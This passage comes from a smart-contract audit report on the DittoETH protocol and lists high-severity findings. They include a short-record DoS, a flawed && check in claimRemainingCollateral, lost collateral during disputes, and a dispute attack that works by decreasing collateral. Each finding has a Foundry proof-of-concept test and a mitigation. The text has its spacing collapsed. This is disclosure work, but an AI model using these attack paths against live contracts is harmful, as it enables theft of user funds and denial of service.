Since there is no valid Short Order Id, if he passes any value it reverts when the user tries to exit. Because the id needs to be associated with theshortRecordand still be owned by him to pass the checks.exitShort()function callscheckCancelShortOrder()which will revert in the check below.
LibSRUtil.sol#L57
if(shortOrder.shortRecordId!=shortRecordId||shortOrder.addr!=shorter)revertErrors.InvalidShortOrder();
ForexitShortWallet()andexitShortErcEscrowed(), they revert in the check below when they callcheckShortMinErc().
LibSRUtil.sol#L84
if(shortOrder.shortRecordId!=shortRecordId||shortOrder.addr!=shorter)revertErrors.InvalidShortOrder();
Liquidation
The primary and secondary liquidation calls require a Short Order Id.
Primary Liquidation call:
PrimaryLiquidationFacet.sol#L47
functionliquidate(addressasset,addressshorter,uint8id,uint16[]memoryshortHintArray,❌uint16shortOrderId)
Secondary Liquidation call:
SecondaryLiquidationFacet.sol#L39
functionliquidateSecondary(addressasset,❌   MTypes.BatchLiquidation[]memorybatches,uint88liquidateAmount,boolisWallet)
BatchLiquidationstruct:
struct BatchLiquidation {address shorter;uint8 shortId;❌      uint16 shortOrderId;}
Theliquidate()function reverts in its call tocheckCancelShortOrder(). The check below causes the revert, because the id passed by the liquidator needs to be associated with the Short Record and still be owned by the user being liquidated to pass the check.
LibSRUtil.sol#L57
if (shortOrder.shortRecordId != shortRecordId || shortOrder.addr != shorter) revert Errors.InvalidShortOrder();
TheliquidateSecondary()function uses a loop to complete batch liquidation. In the loop, it first does the check below on each batch element.
SecondaryLiquidationFacet.sol#L69-L80
boolshortUnderMin;if(m.isPartialFill) {// Check attached shortOrder ercAmount left since SR will be fully liquidatedSTypes.OrderstorageshortOrder=s.shorts[m.asset][m.shortOrderId];❌shortUnderMin=shortOrder.ercAmount<minShortErc;❌if(shortUnderMin) {// Skip instead of reverting for invalid shortOrder❌if(shortOrder.shortRecordId!=m.short.id||shortOrder.addr!=m.shorter) {continue;}}}
The loop skips liquidating if the Short Record’s debt is below the minimum i.e.shortUnderMinis true for the passedshortOrderandshortOrder.shortRecordId != m.short.id || shortOrder.addr != m.shorterevaluates to true since the short order isn’t attached to the Short Record.
It reverts in the check below.liquidateAmountis the amount the liquidator wants to liquidate andliquidateAmountLeftis the amount not liquidated. If only the bad Short Record is in the batch, it reverts. If other Short Records in the batch get liquidated it doesn’t revert.
SecondaryLiquidationFacet.sol#L124
if(liquidateAmount==liquidateAmountLeft)revertErrors.SecondaryLiquidationNoValidShorts();
Note: Secondary Liquidation can still be done in some scenarios check the POC section for more details.
Apart from the DOS effects above, the issue also lets a user create a Short Record with an erc amount below theminShortErc. Check the POC.
Impact
The issue above has the following effects:
Users cannot exit a Short Record Position.Primary Liquidation cannot be done on the Short Record.Secondary Liquidation may not be possible on the Short Record.Allows a user to create a Short Record belowminShortErc.
Proof of Concept
The tests can be run in theShorts.t.solfile.
The POC below consists of 5 tests:
test_FailExit(): Shows how exiting a Short Record can fail.test_CreateShortLessThanMin(): Shows how a Short Record with less erc debt than the minimum can be created.test_FailPrimaryLiquidation(): Shows how primary liquidation fails.test_FailSecondaryLiquidation(): Shows how Secondary liquidation fails.test_PassSecondaryLiquidation(): Shows how Secondary Liquidation can pass and exposes another bug.
It also contains a utility function for setting up the Short Record,createPartiallyFilledSR.
Add this import statement to the top of theShorts.t.solfile:
import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";
// util function and errors used by testerrorInvalidShortOrder();errorSecondaryLiquidationNoValidShorts();functioncreatePartiallyFilledSR(uintamount)publicreturns(STypes.ShortRecordmemoryshort){// get minimum askuintminAskEth=diamond.getAssetNormalizedStruct(asset).minAskEth;// The bid is opened with an amount that allows short to be 1 less than// the minAskEth.fundLimitBidOpt(1ether,uint88(amount-minAskEth+1),receiver);// open shortfundLimitShortOpt(1ether,uint88(amount),sender);// get the ShortRecord createdshort=getShortRecord(sender,C.SHORT_STARTING_ID);assertTrue(short.status==SR.PartialFill);// no short ordersSTypes.Order[]memoryshortOrders=getShorts();assertEq(shortOrders.length,0);returnshort;}functiontest_FailExit()public{// create partially filled SR with no short ordercreatePartiallyFilledSR(3000ether);// give sender assets to exit shortdeal(asset,sender,1000ether);// cannot exit the SRvm.expectRevert(InvalidShortOrder.selector);exitShortWallet(C.SHORT_STARTING_ID,1000ether,sender);}functiontest_CreateShortLessThanMin()public{// create partially filled SR with no short orderSTypes.ShortRecordmemoryshort=createPartiallyFilledSR(2000ether);uintminShortErc=diamond.getAssetNormalizedStruct(asset).minShortErc;// created SR has less than minShortErcassertGt(minShortErc,short.ercDebt);}functiontest_FailPrimaryLiquidation()public{// create partially filled SR with no short ordercreatePartiallyFilledSR(3000ether);// change price to let short record be liquidatableuint256newPrice=1.5ether;skip(15minutes);ethAggregator.setRoundData(92233720368547778907wei,int(newPrice.inv()) /ORACLE_DECIMALS,block.timestamp,block.timestamp,92233720368547778907wei);fundLimitAskOpt(1.5ether,2000ether,receiver);// add ask to allow liquidation have a sell// liquidation revertsvm.expectRevert(InvalidShortOrder.selector);diamond.liquidate(asset,sender,C.SHORT_STARTING_ID,shortHintArrayStorage,0);}functiontest_FailSecondaryLiquidation()public{// create partially filled SR with no short orderSTypes.ShortRecordmemoryshort=createPartiallyFilledSR(3000ether);// change price to let short record be liquidatableuint256newPrice=1.5ether;skip(15minutes);ethAggregator.setRoundData(92233720368547778907wei,int(newPrice.inv()) /ORACLE_DECIMALS,block.timestamp,block.timestamp,92233720368547778907wei);// give receiver assets to complete liquidationdeal(asset,receiver,short.ercDebt);// create batchMTypes.BatchLiquidation[]memorybatch=newMTypes.BatchLiquidation[](1);batch[0] =MTypes.BatchLiquidation(sender,C.SHORT_STARTING_ID,0);vm.prank(receiver);// cannot liquidatevm.expectRevert(SecondaryLiquidationNoValidShorts.selector);diamond.liquidateSecondary(asset,batch,short.ercDebt,true);}// This shows that secondary liquidation can still occurfunctiontest_PassSecondaryLiquidation()public{// create partially filled SR with no short orderSTypes.ShortRecordmemoryshort=createPartiallyFilledSR(3000ether);// change price to let short record be liquidatableuint256newPrice=1.5ether;skip(15minutes);ethAggregator.setRoundData(92233720368547778907wei,int(newPrice.inv()) /ORACLE_DECIMALS,block.timestamp,block.timestamp,92233720368547778907wei);// create another short for sender// the id of this short can be used for liquidationfundLimitShortOpt(1ether,3000ether,sender);STypes.Order[]memoryshortOrders=getShorts();shortOrders=getShorts();// give receiver assets to complete liquidationdeal(asset,receiver,short.ercDebt);// create batchMTypes.BatchLiquidation[]memorybatch=newMTypes.BatchLiquidation[](1);batch[0] =MTypes.BatchLiquidation(sender,C.SHORT_STARTING_ID,shortOrders[0].id);vm.prank(receiver);// successful liquidationdiamond.liquidateSecondary(asset,batch,short.ercDebt,true);}
Recommended Mitigation Steps
Consider settingercAmountof theincomingAskto zero in thesellMatchAlgo()function. This will allow thematchIncomingSell()call to set the Short Record to a Fully Filled state.
LibOrders.sol#L590-L598
if(startingId==C.TAIL) {-matchIncomingSell(asset,incomingAsk,matchTotal);if(incomingAsk.ercAmount.mul(incomingAsk.price) >=minAskEth) {addSellOrder(incomingAsk,asset,orderHintArray);}+incomingAsk.ercAmount=0;+matchIncomingSell(asset,incomingAsk,matchTotal);s.bids[asset][C.HEAD].nextId=C.TAIL;return;}
Assessed type
DoS
ditto-eth (DittoETH) confirmed and commented:
Great find, POC very helpful.

[H-05] Flawed if check causes inaccurate tracking of the protocol’sercDebtand collateral
Submitted bysamuraii77, also found bysamuraii77andserial-coder
A flawed if check using&&instead of||inRedemptionFacet::claimRemainingCollateral()leads to a break of one of the core protocol invariants. The total collateral andercDebtof an asset should always equal the total collateral andercDebtof allshortRecordscombined. However, this will not be the case if the scenario explained below takes place. This results in the protocol holding inaccurate values of theirercDebtand collateral which are extremely important values used for very important calculations across the entire protocol.
Proof of Concept
Imagine the following scenario:
Shorterhas a fewshortRecords.Redeemerproposes a redemption for one of theshortRecordsowned byshorter.ThetimeToDisputepasses.Redeemer2proposes redemption for another one of theshortRecordsowned byshorter.Even thoughtimeToDisputehas not passed forredeemer2,shorteris able to callRedemptionFacet::claimCollateral()successfully because of a flawed if check.
if(claimProposal.shorter!=msg.sender&&claimProposal.shortId!=id)revertErrors.CanOnlyClaimYourShort();
5.1ShortercallsRedemptionFacet::claimRemainingCollateral()with the address ofredeemerand with the ID of theshortRecordproposed byredeemer2.5.2redeemerAssetUserin the function is nowredeemer.5.3 The check for time to dispute passes as enough time has passed forredeemer’stimeToDispute.5.4claimProposalis thedecodedProposalDataofredeemer.5.5 The if check doesn’t lead to a revert because it is flawed,claimProposal.shorteris==tomsg.senderas he is the owner of the initialshortRecord; however, theclaimProposal.shortIdis not equal to the given ID sinceclaimProposal.shortIdis based on the initial redeemer proposal and the given ID is the ID for theshortRecordproposed byredeemer2which makes the if check (true&&false) resulting in false and the code continues.5.6_claimRemainingCollateral()is called with theshorteraddress (msg.sender) andshortIdequal to the given ID (ID of theshortRecordproposed byredeemer2).5.7 Check successfully passes andshorterclaims collateral and deletesshortRecordwithout having to wait thetimeToDispute.As theshortRecordis deleted beforetimeToDisputeis over,RedemptionFacet::disputeRedemption()is still callable.Disputersuccessfully disputes the already deletedshortRecord.RedemptionFacet::disputeRedemption()gives back thecollateralandercDebtto the already deletedshortRecord.It also increments the asset’scollateralandercDebt.
for(uint256i=incorrectIndex;i<decodedProposalData.length;i++) {currentProposal=decodedProposalData[i];STypes.ShortRecordstoragecurrentSR=s.shortRecords[d.asset][currentProposal.shorter][currentProposal.shortId];currentSR.collateral+=currentProposal.colRedeemed;currentSR.ercDebt+=currentProposal.ercDebtRedeemed;d.incorrectCollateral+=currentProposal.colRedeemed;d.incorrectErcDebt+=currentProposal.ercDebtRedeemed;}s.vault[Asset.vault].dethCollateral+=d.incorrectCollateral;Asset.dethCollateral+=d.incorrectCollateral;Asset.ercDebt+=d.incorrectErcDebt;
Since theshortRecordis deleted, it makes the asset’sercDebtandcollateralinaccurate as it includes theercDebtandcollateralof a non-existentshortRecord.Such inaccuracy is detrimental to the protocol as inaccurate values for theercDebtandcollateralwill be used across the whole protocol for extremely important functions and calculations.
Add the following POC function toRedemption.t.sol:
functiontestRuinsDebtAndCollateralTracking()public{// Set up all of the usersaddressshorter=sender;addressredeemer=receiver;addressredeemer2=makeAddr('redeemer2');depositEth(redeemer2,INITIAL_ETH_AMOUNT);addressdisputer=makeAddr('disputer');for(uint256i=0;i<6;i++) {if(i%2==0) {fundLimitBidOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,redeemer);fundLimitShortOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,shorter);}else{fundLimitBidOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,redeemer2);fundLimitShortOpt(DEFAULT_PRICE,DEFAULT_AMOUNT,shorter);}}_setETH(50000ether);fundLimitBidOpt(DEFAULT_PRICE-0.000000001ether,DEFAULT_AMOUNT,redeemer2);fundLimitShortOpt(DEFAULT_PRICE-0.000000001ether,DEFAULT_AMOUNT,shorter);MTypes.ProposalInput[]memoryredeemerProposalInputs=newMTypes.ProposalInput[](1);redeemerProposalInputs[0] =MTypes.ProposalInput({shorter:shorter,shortId:C.SHORT_STARTING_ID,shortOrderId:0});_setETH(1000ether);vm.prank(redeemer);diamond.proposeRedemption(asset,redeemerProposalInputs,DEF_REDEMPTION_AMOUNT,MAX_REDEMPTION_FEE);// Redeemer creates a proposalskip(diamond.getAssetUserStruct(asset,redeemer).timeToDispute);// Skip the time to dispute for the first proposal (5401 seconds)MTypes.ProposalInput[]memoryredeemer2ProposalInputs=newMTypes.ProposalInput[](1);redeemer2ProposalInputs[0] =MTypes.ProposalInput({shorter:shorter,shortId:C.SHORT_STARTING_ID+1,shortOrderId:0});vm.prank(redeemer2);diamond.proposeRedemption(asset,redeemer2ProposalInputs,DEF_REDEMPTION_AMOUNT,MAX_REDEMPTION_FEE);// Redeemer2 creates a proposalassert(diamond.getOffsetTime() <diamond.getAssetUserStruct(asset,redeemer2).timeToDispute);// Not enough time has passed in order to redeem the second proposal (5402 < 10802)vm.expectRevert(Errors.TimeToDisputeHasNotElapsed.selector);vm.prank(redeemer2);diamond.claimRedemption(asset);// This correctly reverts as 5401 seconds have not passed and bug is non-existent in claimRedemption()STypes.ShortRecord[]memoryshortRecordsBefore=diamond.getShortRecords(asset,shorter);// Get shortRecords before the deletionvm.prank(shorter);diamond.claimRemainingCollateral(asset,redeemer,0,C.SHORT_STARTING_ID+1);// Claiming collateral without waiting (this is the bug)STypes.ShortRecord[]memoryshortRecordsAfter=diamond.getShortRecords(asset,shorter);// Get shortRecords after the deletionuint256totalShortRecordsCollateralBefore;uint256totalShortRecordsDebtBefore;for(uint256i=0;i<shortRecordsAfter.length;i++) {// Get the total collateral and total debt for the short recordstotalShortRecordsCollateralBefore+=shortRecordsAfter[i].collateral;totalShortRecordsDebtBefore+=shortRecordsAfter[i].ercDebt;}// Compare the total collateral and total debt based on the short records vs. based on the asset struct (they are equal as they should be)STypes.AssetmemoryassetStruct=diamond.getAssetStruct(asset);assertEq(totalShortRecordsCollateralBefore,assetStruct.dethCollateral);// 32500000000000000000assertEq(totalShortRecordsDebtBefore,assetStruct.ercDebt);// 20000000000000000000000assertEq(shortRecordsAfter.length,shortRecordsBefore.length-1);// Deletion happenedvm.prank(disputer);diamond.disputeRedemption(asset,redeemer2,0,shorter,C.SHORT_STARTING_ID+6);// Dispute with a shortRecord with a lower CRSTypes.ShortRecord[]memoryshortRecordsFinal=diamond.getShortRecords(asset,shorter);// Current short recordsSTypes.AssetmemorycurrentAssetStruct=diamond.getAssetStruct(asset);// Current asset structuint256currentTotalShortRecordsCollateral;uint256currentTotalShortRecordsDebt;for(uint256i=0;i<shortRecordsFinal.length;i++) {// Get the total collateral and total debt for the short recordscurrentTotalShortRecordsCollateral+=shortRecordsFinal[i].collateral;currentTotalShortRecordsDebt+=shortRecordsFinal[i].ercDebt;}assert(currentTotalShortRecordsDebt!=currentAssetStruct.ercDebt);// 25000000000000000000000 30000000000000000000000assert(currentTotalShortRecordsCollateral!=currentAssetStruct.dethCollateral);// 39999970000000000000 44999969999999999999}
Recommended Mitigation Steps
Use||instead of&&
+ if (claimProposal.shorter != msg.sender || claimProposal.shortId != id) revert Errors.CanOnlyClaimYourShort();- if (claimProposal.shorter != msg.sender && claimProposal.shortId != id) revert Errors.CanOnlyClaimYourShort();
Assessed type
Invalid Validation
ditto-eth (DittoETH) confirmed

[H-06] Closing a SR during a wrong redemption proposal leads to loss of funds
Submitted byCosine, also found byklau5
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L267-L268
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/libraries/AppStorage.sol#L92
Impact
When a user creates a redemption proposal with theproposeRedemptionfunction the user has to provide a list of the short records (SRs) with the lowest collateral ratios (CR) in the system ascending.
To prevent users from creating proposals with a wrong SR list, anyone is allowed to dispute proposals with thedisputeRedemptionfunction. This function allows the disputer to prove that a SR with a lower CR was not included in the proposal and for doing so the disputer receives a penalty fee from the proposer.
If between these flows of creating a wrong proposal and disputing it a SR is closed (liquidation, exiting, transfer, …) the collateral is added to the closed SR and can not be recovered.
Proof of Concept
The following POC can be implemented in theRedemption.t.soltest file:
functiontest_dispute_on_non_existing_sr()public{// setup shortsmakeShorts({singleShorter:true});_setETH(1000ether);skip(1hours);STypes.ShortRecordmemorysr1=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID);STypes.ShortRecordmemorysr2=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+1);STypes.ShortRecordmemorysr3=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+2);uint256cr1=diamond.getCollateralRatio(asset,sr1);uint256cr2=diamond.getCollateralRatio(asset,sr2);uint256cr3=diamond.getCollateralRatio(asset,sr3);// CRs are increasingassertGt(cr2,cr1);assertGt(cr3,cr2);// user creates a wrong proposalMTypes.ProposalInput[]memoryproposalInputs=makeProposalInputsForDispute({shortId1:C.SHORT_STARTING_ID+1,shortId2:C.SHORT_STARTING_ID+2});addressredeemer=receiver;vm.prank(redeemer);diamond.proposeRedemption(asset,proposalInputs,DEFAULT_AMOUNT*3/2,MAX_REDEMPTION_FEE);// on of the SRs in the proposal is closedfundLimitAskOpt(DEFAULT_PRICE,DEFAULT_AMOUNT/2,extra);exitShort(C.SHORT_STARTING_ID+2,DEFAULT_AMOUNT/2,DEFAULT_PRICE,sender);// SR is now closedsr3=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+2);assertEq(uint(sr3.status),uint(SR.Closed));uint88collateralBefore=sr3.collateral;// another user disputes the wrong proposaladdressdisputer=extra;vm.prank(disputer);diamond.disputeRedemption({asset:asset,redeemer:redeemer,incorrectIndex:0,disputeShorter:sender,disputeShortId:C.SHORT_STARTING_ID});// SR is still closed and collateral increasedsr3=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+2);assertEq(uint(sr3.status),uint(SR.Closed));assertGt(sr3.collateral,collateralBefore);}
Recommended Mitigation Steps
Opening up the SR again if it’s closed would be a solution, but it could probably be misused to avoid liquidations. Therefore, carefully think about the implications of changes in this context.
Assessed type
Context
ditto-eth (DittoETH) confirmed

[H-07] Valid redemption proposals can be disputed by decreasing collateral
Submitted byCosine, also found byilchovskiandklau5
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/RedemptionFacet.sol#L259
https://github.com/code-423n4/2024-03-dittoeth/blob/91faf46078bb6fe8ce9f55bcb717e5d2d302d22e/contracts/facets/ShortRecordFacet.sol#L81-L104
Impact
When a user creates a redemption proposal with theproposeRedemptionfunction the user has to provide a list of the short records (SRs) with the lowest collateral ratios (CR) in the system ascending.
To prevent users from creating proposals with a wrong SR list, anyone is allowed to dispute proposals with thedisputeRedemptionfunction. This function allows the disputer to prove that a SR with a lower CR was not included in the proposal and for doing so the disputer receives a penalty fee from the proposer. Therefore, if an attacker can dispute a valid redemption proposal, the attacker can steal funds from a proposer.
To avoid malicious disputers the system invented aDISPUTE_REDEMPTION_BUFFERthat should prevent users from disputing with a SR that was created/modified<=1 hour before the redemption proposal was created:
if(disputeCR<incorrectProposal.CR&&disputeSR.updatedAt+C.DISPUTE_REDEMPTION_BUFFER<=redeemerAssetUser.timeProposed)
But not every function that modifies a SR updates theupdatedAtparam. This enables the possibility for an attacker to dispute a valid redemption proposal by modifying a SR after the proposal so that the proposer does not have the chance to create a correct proposal.
ThedecreaseCollateralfunction does not update theupdatedAtparam and therefore, the following attack path is enabled:
initialCRof the given asset is set to 1.7 (as in the docs) and the max redemption CR is 2 (constant).User creates a valid redemption proposal where the SRs have a CR above theinitialCR.The attacker owns a SR with a CR above the ones in the proposal.The attacker decreases the CR of the own SR to theinitialCR, disputes the redemption to receive the penalty fee, and increases the CR back up in one transaction.
Proof of Concept
The following POC can be implemented in theRedemption.t.soltest file:
functiontest_decrease_cr_dispute_attack()public{// add import {O} from "contracts/libraries/DataTypes.sol"; to the imports to run this test// create three SRs with increasing CRs above initialCR// set initial CR to 1.7 as in the docsvm.startPrank(owner);diamond.setInitialCR(asset,170);uint80price=diamond.getOraclePriceT(asset);fundLimitBidOpt(price,DEFAULT_AMOUNT,receiver);depositEth(sender,price.mulU88(DEFAULT_AMOUNT).mulU88(100e18));uint16[]memoryshortHintArray=setShortHintArray();MTypes.OrderHint[]memoryorderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,price,DEFAULT_AMOUNT,orderHintArray,shortHintArray,70);fundLimitBidOpt(price+1,DEFAULT_AMOUNT,receiver);shortHintArray=setShortHintArray();orderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,price,DEFAULT_AMOUNT,orderHintArray,shortHintArray,80);fundLimitBidOpt(price+2,DEFAULT_AMOUNT,receiver);shortHintArray=setShortHintArray();orderHintArray=diamond.getHintArray(asset,price,O.LimitShort,1);vm.prank(sender);diamond.createLimitShort(asset,price,DEFAULT_AMOUNT,orderHintArray,shortHintArray,100);skip(1hours);STypes.ShortRecordmemorysr1=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID);STypes.ShortRecordmemorysr2=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+1);STypes.ShortRecordmemorysr3=diamond.getShortRecord(asset,sender,C.SHORT_STARTING_ID+2);uint256cr1=diamond.getCollateralRatio(asset,sr1);uint256cr2=diamond.getCollateralRatio(asset,sr2);uint256cr3=diamond.getCollateralRatio(asset,sr3);// CRs are increasingassertGt(cr2,cr1);assertGt(cr3,cr2);// user proposes a redemptionuint88_redemptionAmounts=DEFAULT_AMOUNT*2;uint88initialErcEscrowed=DEFAULT_AMOUNT;MTypes.ProposalInput[]memoryproposalInputs=makeProposalInputsForDispute({shortId1:C.SHORT_STARTING_ID,shortId2:C.SHORT_STARTING_ID+1});addressredeemer=receiver;vm.prank(redeemer);diamond.proposeRedemption(asset,proposalInputs,_redemptionAmounts,MAX_REDEMPTION_FEE);// attacker decreases collateral of a SR with a CR above the ones in the proposal so that they fall below the CR of the SRs in the proposaluint32updatedAtBefore=getShortRecord(sender,C.SHORT_STARTING_ID+2).updatedAt;vm.prank(sender);diamond.decreaseCollateral(asset,C.SHORT_STARTING_ID+2,0.3e18);uint32updatedAtAfter=getShortRecord(sender,C.SHORT_STARTING_ID+2).updatedAt;// updatedAt param is not updated when decreasing collateralassertEq(updatedAtBefore,updatedAtAfter);// attacker successfully disputes the redemption proposaladdressdisputer=extra;vm.prank(disputer);diamond.disputeRedemption({asset:asset,redeemer:redeemer,incorrectIndex:1,disputeShorter:sender,disputeShortId:C.SHORT_STARTING_ID+2});}
Recommended Mitigation Steps
Update theupdatedAtparam when decreasing collateral, or do now allow redemption proposals of SRs above theinitialCR(as decreasing below that is not possible).
Assessed type
Context
ditto-eth (DittoETH) confirmed

